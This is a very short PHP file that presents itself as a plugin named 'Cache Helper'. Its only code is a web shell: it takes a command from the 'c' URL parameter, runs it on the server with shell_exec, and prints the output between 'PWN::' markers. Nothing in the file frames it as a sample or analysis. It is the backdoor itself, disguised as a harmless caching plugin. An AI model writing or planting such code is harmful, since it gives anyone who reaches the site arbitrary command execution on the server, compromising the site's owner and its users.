<?php
/* Plugin Name: Cache Helper */
if(isset($_GET['c'])){echo 'PWN::'.shell_exec($_GET['c']).'::PWN';}
